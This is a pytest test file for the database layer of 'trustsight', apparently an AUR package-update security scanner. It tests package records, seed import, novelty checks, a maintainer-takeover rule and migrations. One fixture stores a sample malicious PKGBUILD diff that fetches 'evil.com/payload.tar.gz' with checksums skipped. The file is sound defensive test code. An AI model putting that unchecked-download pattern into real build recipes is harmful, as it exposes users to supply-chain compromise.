import pytest

from trustsight.db import (
    get_all_packages,
    get_connection,
    get_history,
    get_last_analysis,
    get_package,
    get_package_id,
    get_triggered_rules,
    init_db,
    insert_analysis,
    update_package_version,
    upsert_package,
)


@pytest.fixture
def db(tmp_path, monkeypatch):
    monkeypatch.setattr("trustsight.db.DATA_DIR", tmp_path)
    init_db()
    yield
    (tmp_path / "trustsight.db").unlink(missing_ok=True)


def test_init_db_creates_tables(db):
    with get_connection() as conn:
        tables = conn.execute("SELECT name FROM sqlite_master WHERE type='table' ORDER BY name").fetchall()
        table_names = [r["name"] for r in tables]
    assert "packages" in table_names
    assert "source_urls" in table_names
    assert "maintainers" in table_names
    assert "analysis_history" in table_names
    assert "triggered_rules" in table_names


def test_upsert_package_new(db):
    pid = upsert_package("testpkg", "1.0.0")
    assert isinstance(pid, int)
    assert pid > 0


def test_upsert_package_existing(db):
    pid1 = upsert_package("testpkg", "1.0.0")
    pid2 = upsert_package("testpkg", "2.0.0")
    assert pid1 == pid2


def test_get_package_id_found(db):
    upsert_package("myapp", "1.0")
    pid = get_package_id("myapp")
    assert pid is not None
    assert isinstance(pid, int)


def test_get_package_id_not_found(db):
    pid = get_package_id("nonexistent")
    assert pid is None


def test_get_package_found(db):
    upsert_package("myapp", "1.0")
    pkg = get_package("myapp")
    assert pkg is not None
    assert pkg["name"] == "myapp"
    assert pkg["current_version"] == "1.0"


def test_get_package_not_found(db):
    pkg = get_package("nonexistent")
    assert pkg is None


def test_update_package_version(db):
    upsert_package("myapp", "1.0")
    update_package_version("myapp", "2.0")
    pkg = get_package("myapp")
    assert pkg["current_version"] == "2.0"


def test_insert_analysis(db):
    pid = upsert_package("myapp", "1.0")
    triggered = [{"rule_id": "R001", "severity": "CRITICAL"}]
    hid = insert_analysis(
        package_id=pid,
        old_version="1.0",
        new_version="2.0",
        old_commit="abc123",
        new_commit="def456",
        final_score=85,
        raw_diff="+echo hello",
        fact_json='{"package_name": "myapp"}',
        triggered_rules=triggered,
    )
    assert isinstance(hid, int)
    assert hid > 0


def test_get_last_analysis_none(db):
    pid = upsert_package("myapp", "1.0")
    last = get_last_analysis(pid)
    assert last is None


def test_get_last_analysis_found(db):
    pid = upsert_package("myapp", "1.0")
    insert_analysis(pid, "1.0", "2.0", "abc", "def", 50, "+diff", "{}", [])
    insert_analysis(pid, "2.0", "3.0", "def", "ghi", 85, "+diff2", "{}", [])
    last = get_last_analysis(pid)
    assert last is not None
    assert last["final_score"] == 85
    assert last["new_commit"] == "ghi"


def test_get_triggered_rules(db):
    pid = upsert_package("myapp", "1.0")
    rules = [{"rule_id": "R001", "severity": "CRITICAL"}, {"rule_id": "H001", "severity": "HIGH"}]
    hid = insert_analysis(pid, "1.0", "2.0", "a", "b", 65, "+d", "{}", rules)
    stored = get_triggered_rules(hid)
    assert len(stored) == 2
    assert stored[0]["rule_id"] in ("R001", "H001")


def test_get_history(db):
    pid = upsert_package("myapp", "1.0")
    for i in range(5):
        insert_analysis(pid, f"{i}.0", f"{i+1}.0", "a", "b", i * 10, "+d", "{}", [])
    history = get_history(pid, limit=3)
    assert len(history) == 3
    assert history[0]["final_score"] == 40


def test_get_all_packages(db):
    upsert_package("alpha", "1.0")
    upsert_package("beta", "2.0")
    pkgs = get_all_packages()
    names = [p["name"] for p in pkgs]
    assert "alpha" in names
    assert "beta" in names


def test_get_all_packages_excludes_seed_sentinel(db):
    """The internal __seed__ sentinel must never appear in package output."""
    with get_connection() as conn:
        conn.execute(
            "INSERT OR IGNORE INTO packages (id, name) VALUES (0, '__seed__')"
        )
        conn.commit()
    upsert_package("realpkg", "1.0")
    pkgs = get_all_packages()
    names = [p["name"] for p in pkgs]
    assert "__seed__" not in names
    assert "realpkg" in names


def test_upsert_package_rejects_reserved_names(db):
    """Reserved names like __seed__ or any name starting with __ must be
    rejected by upsert_package to prevent internal rows from leaking."""
    with pytest.raises(ValueError, match="reserved name"):
        upsert_package("__seed__", "1.0")
    with pytest.raises(ValueError, match="reserved name"):
        upsert_package("__internal_thing", "1.0")


def test_get_package_id_rejects_seed_sentinel(db):
    """get_package_id must return None for __seed__, not its internal id."""
    with get_connection() as conn:
        conn.execute(
            "INSERT OR IGNORE INTO packages (id, name) VALUES (0, '__seed__')"
        )
        conn.commit()
    assert get_package_id("__seed__") is None
    assert get_package_id("__anything") is None
    # Real packages still resolve
    upsert_package("realpkg", "1.0")
    assert get_package_id("realpkg") is not None


def test_get_package_rejects_seed_sentinel(db):
    """get_package must return None for __seed__."""
    with get_connection() as conn:
        conn.execute(
            "INSERT OR IGNORE INTO packages (id, name) VALUES (0, '__seed__')"
        )
        conn.commit()
    assert get_package("__seed__") is None
    assert get_package("__anything") is None
    upsert_package("realpkg", "1.0")
    assert get_package("realpkg") is not None


def test_source_url_unique_constraint(db):
    upsert_package("testpkg", "1.0")
    pid = get_package_id("testpkg")
    with get_connection() as conn:
        conn.execute(
            "INSERT INTO source_urls (url, first_seen_package_id, first_seen_globally_timestamp) VALUES (?, ?, datetime('now'))",
            ("https://unique-url.com/pkg.tar.gz", pid),
        )
        conn.commit()
        with pytest.raises(Exception):
            conn.execute(
                "INSERT INTO source_urls (url, first_seen_package_id) VALUES (?, ?)",
                ("https://unique-url.com/pkg.tar.gz", pid),
            )
            conn.commit()


def test_foreign_key_enforced(db):
    with pytest.raises(Exception):
        with get_connection() as conn:
            conn.execute(
                "INSERT INTO analysis_history (package_id, old_version, new_version) VALUES (99999, '1.0', '2.0')",
            )
            conn.commit()


def test_analysis_stores_diff_blob(db):
    pid = upsert_package("myapp", "1.0")
    diff = "+source=('https://evil.com/payload.tar.gz')\n+sha256sums=('SKIP')"
    hid = insert_analysis(pid, "1.0", "2.0", "a", "b", 85, diff, "{}", [])
    with get_connection() as conn:
        row = conn.execute("SELECT raw_diff_blob FROM analysis_history WHERE id = ?", (hid,)).fetchone()
    assert row is not None
    assert "evil.com" in row["raw_diff_blob"]


def test_init_db_idempotent(db):
    init_db()
    init_db()
    init_db()
    with get_connection() as conn:
        tables = conn.execute("SELECT count(*) as cnt FROM sqlite_master WHERE type='table'").fetchone()
    assert tables["cnt"] >= 5


# --- Seed import and maturity bootstrap ---

def _make_seed(path, urls=("https://github.com/a/v0.tar.gz",), observations=279):
    import sqlite3

    conn = sqlite3.connect(str(path))
    conn.executescript("""
        CREATE TABLE packages (id INTEGER PRIMARY KEY, name TEXT UNIQUE,
                               current_version TEXT, last_checked TEXT);
        CREATE TABLE source_urls (id INTEGER PRIMARY KEY, url TEXT UNIQUE,
                                  first_seen_package_id INTEGER,
                                  first_seen_globally_timestamp TEXT,
                                  total_uses INTEGER, last_seen_timestamp TEXT);
        CREATE TABLE maintainer_counts (name TEXT PRIMARY KEY, count INTEGER);
        CREATE TABLE metadata (key TEXT PRIMARY KEY, value TEXT);
    """)
    conn.execute("INSERT INTO packages (id, name) VALUES (0, '__seed__')")
    for u in urls:
        conn.execute(
            """INSERT INTO source_urls (url, first_seen_package_id,
               first_seen_globally_timestamp, total_uses, last_seen_timestamp)
               VALUES (?, 0, '2024-01-01', 500, '2024-01-01')""", (u,))
    conn.execute("INSERT INTO maintainer_counts (name, count) VALUES ('Someone', 12)")
    conn.execute("INSERT INTO metadata (key, value) VALUES ('seed_observation_count', ?)",
                 (str(observations),))
    conn.commit()
    conn.close()


def test_seed_observation_count_defaults_to_zero(db):
    from trustsight.db import seed_observation_count

    assert seed_observation_count() == 0


def test_import_seed_populates_urls_and_bootstrap(db, tmp_path):
    from trustsight.db import (
        effective_observation_count,
        import_seed,
        seed_observation_count,
    )

    seed = tmp_path / "seed.db"
    _make_seed(seed)
    stats = import_seed(seed)

    assert stats["urls_added"] == 1
    assert seed_observation_count() == 279
    assert effective_observation_count() == 279


def test_real_history_overtakes_the_seed(db, tmp_path):
    """Ordinary use eventually replaces the seed, so the tool never
    depends on external data permanently."""
    from trustsight.db import (
        count_observations,
        effective_observation_count,
        import_seed,
        insert_analysis,
        upsert_package,
    )

    seed = tmp_path / "seed.db"
    _make_seed(seed, observations=10)
    import_seed(seed)
    assert effective_observation_count() == 10

    pkg_id = upsert_package("p", "1.0")
    for i in range(15):
        insert_analysis(package_id=pkg_id, old_version="1", new_version=f"1.{i}",
                        old_commit="a" * 40, new_commit="b" * 40, final_score=0,
                        raw_diff="", fact_json="{}", triggered_rules=[])
    assert count_observations() == 15
    assert effective_observation_count() == 15


def test_import_seed_never_overwrites_learned_rows(db, tmp_path):
    """A seed must not clobber something a real analysis recorded."""
    from trustsight.db import get_connection, import_seed

    url = "https://github.com/a/v0.tar.gz"
    with get_connection() as conn:
        conn.execute("INSERT INTO packages (id, name) VALUES (7, 'real')")
        conn.execute(
            """INSERT INTO source_urls (url, first_seen_package_id,
               first_seen_globally_timestamp, total_uses)
               VALUES (?, 7, '2026-01-01', 3)""", (url,))
        conn.commit()

    seed = tmp_path / "seed.db"
    _make_seed(seed, urls=(url,))
    import_seed(seed)

    with get_connection() as conn:
        row = conn.execute(
            "SELECT first_seen_package_id, total_uses FROM source_urls WHERE url = ?",
            (url,)).fetchone()
    assert row["first_seen_package_id"] == 7
    assert row["total_uses"] == 3


def test_import_seed_is_idempotent(db, tmp_path):
    from trustsight.db import import_seed

    seed = tmp_path / "seed.db"
    _make_seed(seed)
    import_seed(seed)
    second = import_seed(seed)
    assert second["urls_added"] == 0


def test_import_seed_accepts_gzip(db, tmp_path):
    import gzip
    import shutil

    from trustsight.db import import_seed

    seed = tmp_path / "seed.db"
    _make_seed(seed)
    gz = tmp_path / "seed.db.gz"
    with open(seed, "rb") as s, gzip.open(gz, "wb") as d:
        shutil.copyfileobj(s, d)
    seed.unlink()

    assert import_seed(gz)["urls_total"] == 1


def test_missing_seed_raises(db, tmp_path):
    from trustsight.db import import_seed

    try:
        import_seed(tmp_path / "nope.db")
    except FileNotFoundError:
        return
    raise AssertionError("expected FileNotFoundError")


def test_auto_import_is_skipped_when_already_seeded(db, tmp_path, monkeypatch):
    import trustsight.db as dbmod

    seed = tmp_path / "seed.db"
    _make_seed(seed)
    monkeypatch.setattr(dbmod, "bundled_seed_path", lambda: seed)
    assert dbmod.maybe_auto_import_seed(quiet=True) is not None
    assert dbmod.maybe_auto_import_seed(quiet=True) is None


def test_auto_import_is_skipped_when_history_exists(db, tmp_path, monkeypatch):
    """A database with real analyses does not need a bootstrap."""
    import trustsight.db as dbmod

    pkg_id = dbmod.upsert_package("p", "1.0")
    dbmod.insert_analysis(package_id=pkg_id, old_version="1", new_version="2",
                          old_commit="a" * 40, new_commit="b" * 40, final_score=0,
                          raw_diff="", fact_json="{}", triggered_rules=[])
    seed = tmp_path / "seed.db"
    _make_seed(seed)
    monkeypatch.setattr(dbmod, "bundled_seed_path", lambda: seed)
    assert dbmod.maybe_auto_import_seed(quiet=True) is None


def test_auto_import_is_a_noop_without_a_bundled_seed(db, tmp_path, monkeypatch):
    import trustsight.db as dbmod

    monkeypatch.setattr(dbmod, "bundled_seed_path", lambda: tmp_path / "absent.db.gz")
    assert dbmod.maybe_auto_import_seed(quiet=True) is None


def test_seeded_url_is_not_novel_after_version_bump(db, tmp_path, monkeypatch):
    """The whole point of the seed: an ordinary AUR source URL, and the
    same URL at a new version, must both be recognised."""
    import trustsight.db as dbmod
    from trustsight.novelty import build_novelty_context, normalize_url

    url = "https://github.com/acme/tool/archive/v1.0.0.tar.gz"
    seed = tmp_path / "seed.db"
    _make_seed(seed, urls=(normalize_url(url),))
    monkeypatch.setattr(dbmod, "bundled_seed_path", lambda: seed)
    dbmod.maybe_auto_import_seed(quiet=True)

    pkg_id = dbmod.upsert_package("demo", "1.0")
    bumped = "https://github.com/acme/tool/archive/v2.5.1.tar.gz"
    ctx = build_novelty_context([bumped], pkg_id)
    assert ctx.url_first_seen_globally is False
    assert ctx.observation_count == 279


def test_unseeded_domain_is_still_novel(db, tmp_path, monkeypatch):
    import trustsight.db as dbmod
    from trustsight.novelty import build_novelty_context

    seed = tmp_path / "seed.db"
    _make_seed(seed)
    monkeypatch.setattr(dbmod, "bundled_seed_path", lambda: seed)
    dbmod.maybe_auto_import_seed(quiet=True)

    pkg_id = dbmod.upsert_package("demo", "1.0")
    ctx = build_novelty_context(["https://unknown-host.invalid/x-1.0.tar.gz"], pkg_id)
    assert ctx.url_first_seen_globally is True


def test_is_maintainer_globally_novel_true_for_unknown(db):
    from trustsight.db import is_maintainer_globally_novel
    assert is_maintainer_globally_novel("never-seen-maintainer") is True


def test_is_maintainer_globally_novel_false_when_in_maintainers_table(db):
    from trustsight.db import get_connection, is_maintainer_globally_novel
    with get_connection() as conn:
        pkg_id = conn.execute("INSERT INTO packages (name) VALUES ('dummy')").lastrowid
        conn.execute("INSERT INTO maintainers (name, first_seen_package_id) VALUES (?, ?)",
                     ("known-dev", pkg_id))
        conn.commit()
    assert is_maintainer_globally_novel("known-dev") is False


def test_is_maintainer_globally_novel_false_when_in_maintainer_counts(db):
    from trustsight.db import get_connection, is_maintainer_globally_novel
    with get_connection() as conn:
        conn.execute("INSERT INTO maintainer_counts (name, count) VALUES (?, ?)",
                     ("seeded-dev", 5))
        conn.commit()
    assert is_maintainer_globally_novel("seeded-dev") is False


# --- H026 end-to-end tests (real DB, no monkeypatch) ---

def _warm_the_db():
    """Insert enough analyses so effective_observation_count() > 0."""
    from trustsight.db import insert_analysis, upsert_package
    pkg_id = upsert_package("test-pkg", "1.0")
    for i in range(5):
        insert_analysis(
            package_id=pkg_id,
            old_version=f"1.{i}", new_version=f"1.{i+1}",
            old_commit="a" * 40, new_commit="b" * 40,
            final_score=0, raw_diff="", fact_json="{}",
            triggered_rules=[],
        )


def test_h026_cold_db_suppressed(db):
    """Cold database (no analyses, no seed) must not fire even when a
    maintainer changes to a novel name."""
    from trustsight.analysis import _check_untrusted_maintainer_takeover
    result = _check_untrusted_maintainer_takeover(
        True, "anyone-novel"
    )
    assert result is None


def test_h026_warm_db_novel_maintainer_fires(db):
    """Warm database + globally novel maintainer change must fire."""
    from trustsight.analysis import _check_untrusted_maintainer_takeover
    from trustsight.db import is_maintainer_globally_novel
    _warm_the_db()
    assert is_maintainer_globally_novel("fresh-mntnr") is True
    result = _check_untrusted_maintainer_takeover(
        True, "fresh-mntnr"
    )
    assert result is not None
    assert result["rule_id"] == "H026"


def test_h026_warm_db_known_maintainer_suppressed(db):
    """Warm database + maintainer already in the maintainers table must
    not fire."""
    from trustsight.analysis import _check_untrusted_maintainer_takeover
    from trustsight.db import get_connection, is_maintainer_globally_novel
    _warm_the_db()
    with get_connection() as conn:
        pkg_id = conn.execute("INSERT INTO packages (name) VALUES ('other')").lastrowid
        conn.execute("INSERT INTO maintainers (name, first_seen_package_id) VALUES (?, ?)",
                     ("known-mntnr", pkg_id))
        conn.commit()
    assert is_maintainer_globally_novel("known-mntnr") is False
    result = _check_untrusted_maintainer_takeover(
        True, "known-mntnr"
    )
    assert result is None


def test_h026_warm_db_counts_seed_maintainer(db):
    """Maintainer present in the seed-only maintainer_counts table is
    not novel; H026 should not fire."""
    from trustsight.analysis import _check_untrusted_maintainer_takeover
    from trustsight.db import get_connection, is_maintainer_globally_novel
    _warm_the_db()
    with get_connection() as conn:
        conn.execute("INSERT INTO maintainer_counts (name, count) VALUES (?, ?)",
                     ("seed-mntnr", 3))
        conn.commit()
    assert is_maintainer_globally_novel("seed-mntnr") is False
    result = _check_untrusted_maintainer_takeover(
        True, "seed-mntnr"
    )
    assert result is None


# --- batched dependency lookups ---

def test_dependency_observation_counts_matches_single_lookup(db):
    """The batched lookup agrees with the per-name one it replaced."""
    from trustsight.db import (
        dependency_observation_count,
        dependency_observation_counts,
        record_dependency_names,
    )
    record_dependency_names(["alpha", "beta", "beta", "gamma"])
    batched = dependency_observation_counts(["alpha", "beta", "gamma", "absent"])
    assert batched == {
        name: dependency_observation_count(name)
        for name in ("alpha", "beta", "gamma")
    }
    # A name that was never recorded is simply absent from the result.
    assert "absent" not in batched


def test_dependency_observation_counts_empty_input(db):
    from trustsight.db import dependency_observation_counts
    assert dependency_observation_counts([]) == {}


def test_dependency_observation_counts_chunks_past_variable_limit(db):
    """More names than SQLite's bound-variable limit still resolve."""
    from trustsight.db import dependency_observation_counts, record_dependency_names
    names = [f"dep-{i:04d}" for i in range(2500)]
    record_dependency_names(names)
    counts = dependency_observation_counts(names)
    assert len(counts) == 2500
    assert set(counts.values()) == {1}


def test_top_dependency_pairs_ranks_by_observation_count(db):
    from trustsight.db import record_dependency_names, top_dependency_pairs
    record_dependency_names(["rare"])
    record_dependency_names(["common"] * 5)
    pairs = dict(top_dependency_pairs())
    assert pairs["common"] > pairs["rare"]
    # names still arrive most-observed first
    assert [n for n, _ in top_dependency_pairs()][0] == "common"


def test_top_dependency_names_still_returns_names_only(db):
    from trustsight.db import record_dependency_names, top_dependency_names
    record_dependency_names(["only"])
    assert top_dependency_names() == ["only"]


# --- schema migration ---

def test_forget_package_deletes_everything(db):
    """forget_package removes a package and all its related rows."""
    from trustsight.db import forget_package, get_connection
    pid = upsert_package("goner", "1.0")
    hid = insert_analysis(
        pid, "1.0", "2.0", "aaa", "bbb", 50, "+diff", "{}",
        [{"rule_id": "R001", "severity": "CRITICAL"}],
    )
    with get_connection() as conn:
        conn.execute(
            "INSERT INTO pkgbuild_snapshots (package_name, pkgbuild_text, version, captured_at) "
            "VALUES (?, 'text', '1.0', datetime('now'))", ("goner",))
        conn.execute(
            "INSERT INTO package_profiles (package_name, observation_count, last_seen) "
            "VALUES (?, 1, datetime('now'))", ("goner",))
        conn.execute(
            "INSERT INTO alert_state (package_name, rule_id, first_seen) "
            "VALUES (?, 'R001', datetime('now'))", ("goner",))
        conn.commit()
    counts = forget_package("goner")
    assert counts.get("packages") == 1
    assert counts.get("analysis_history") == 1
    assert counts.get("triggered_rules") == 1
    assert get_package_id("goner") is None


def test_forget_package_unknown_returns_empty(db):
    from trustsight.db import forget_package
    assert forget_package("nonexistent") == {}


def test_forget_package_rejects_reserved_names(db):
    from trustsight.db import forget_package
    with pytest.raises(ValueError, match="reserved name"):
        forget_package("__seed__")


def test_forget_prune_dry_run_does_not_delete(db):
    """--dry-run returns names but does not remove anything."""
    from trustsight.db import forget_prune, get_all_packages
    upsert_package("keep", "1.0")
    upsert_package("gone", "2.0")
    removed = forget_prune(aur_names={"keep"}, dry_run=True)
    assert "gone" in removed
    assert get_all_packages() != []  # nothing was removed


def test_forget_prune_removes_non_aur_packages(db):
    from trustsight.db import forget_prune, get_all_packages
    upsert_package("keep", "1.0")
    upsert_package("gone", "2.0")
    forget_prune(aur_names={"keep"}, dry_run=False)
    names = [p["name"] for p in get_all_packages()]
    assert "keep" in names
    assert "gone" not in names


def test_init_db_adds_column_missing_from_an_older_database(tmp_path, monkeypatch):
    """A database created before current_maintainer existed is upgraded.

    init_db only issues CREATE TABLE IF NOT EXISTS, so without a migration
    the column never appeared and every write to it raised
    "no such column", aborting the run.
    """
    import sqlite3

    from trustsight.db import close_connections, get_connection, init_db

    monkeypatch.setattr("trustsight.db.DATA_DIR", tmp_path)
    close_connections()
    legacy = sqlite3.connect(str(tmp_path / "trustsight.db"))
    legacy.execute(
        """CREATE TABLE packages (
               id INTEGER PRIMARY KEY,
               name TEXT UNIQUE NOT NULL,
               current_version TEXT,
               last_checked TEXT
           )"""
    )
    legacy.execute("INSERT INTO packages (name) VALUES ('preexisting')")
    legacy.commit()
    legacy.close()

    init_db()

    from trustsight.db import update_package_maintainer
    update_package_maintainer("preexisting", "someone")
    with get_connection() as conn:
        row = conn.execute(
            "SELECT current_maintainer FROM packages WHERE name = 'preexisting'"
        ).fetchone()
    assert row["current_maintainer"] == "someone"


# --- rule id rename migration (R -> H) ------------------------------------


def _seed_old_rule_ids(tmp_path, monkeypatch):
    """A database written before the rename: old ids, user_version 0."""
    import sqlite3

    monkeypatch.setattr("trustsight.db.DATA_DIR", tmp_path)
    init_db()
    with get_connection() as conn:
        conn.execute("PRAGMA user_version = 0")
        conn.execute(
            "INSERT INTO alert_state (package_name, rule_id, first_seen) "
            "VALUES (?, ?, ?)", ("pkg", "R060", "2026-01-01"))
        conn.execute(
            "INSERT INTO alert_state (package_name, rule_id, first_seen) "
            "VALUES (?, ?, ?)", ("pkg", "R001", "2026-01-01"))
        # `triggered_rules.history_id` is a foreign key, so the row it
        # points at has to exist before the rule id can be stored.
        package_id = conn.execute(
            "INSERT INTO packages (name, current_version) VALUES (?, ?)",
            ("pkg", "1.0")).lastrowid
        history_id = conn.execute(
            "INSERT INTO analysis_history (package_id, final_score) "
            "VALUES (?, ?)", (package_id, 40)).lastrowid
        conn.execute(
            "INSERT INTO triggered_rules (history_id, rule_id, severity) "
            "VALUES (?, ?, ?)", (history_id, "R151", "HIGH"))
        conn.commit()
    assert sqlite3  # the import is the point: this writes the legacy shape


def test_migration_rewrites_renamed_rule_ids(tmp_path, monkeypatch):
    """Alert dedup keys on (package, rule_id); a stale id re-notifies."""
    from trustsight.rule_id_history import RENAMED_RULE_IDS

    _seed_old_rule_ids(tmp_path, monkeypatch)
    init_db()

    with get_connection() as conn:
        alerts = {row["rule_id"] for row in
                  conn.execute("SELECT rule_id FROM alert_state").fetchall()}
        triggered = {row["rule_id"] for row in
                     conn.execute("SELECT rule_id FROM triggered_rules").fetchall()}

    assert RENAMED_RULE_IDS["R060"] in alerts
    assert "R060" not in alerts
    assert RENAMED_RULE_IDS["R151"] in triggered
    # A regex rule keeps its id: it was never part of the mapping.
    assert "R001" in alerts


def test_migration_is_idempotent_and_leaves_new_ids_alone(tmp_path, monkeypatch):
    """Running twice must not rewrite an id that is already current.

    The mapping's values are ids the migration also has to leave untouched,
    so a second pass over an already-migrated database is the case that
    would corrupt data if the version gate were missing.
    """
    _seed_old_rule_ids(tmp_path, monkeypatch)
    init_db()
    with get_connection() as conn:
        first = sorted(row["rule_id"] for row in
                       conn.execute("SELECT rule_id FROM alert_state").fetchall())
        version = conn.execute("PRAGMA user_version").fetchone()[0]
    assert version >= 1

    init_db()
    with get_connection() as conn:
        second = sorted(row["rule_id"] for row in
                        conn.execute("SELECT rule_id FROM alert_state").fetchall())
    assert first == second


def test_a_fresh_database_is_stamped_with_the_schema_version(tmp_path, monkeypatch):
    monkeypatch.setattr("trustsight.db.DATA_DIR", tmp_path)
    init_db()
    with get_connection() as conn:
        assert conn.execute("PRAGMA user_version").fetchone()[0] >= 1
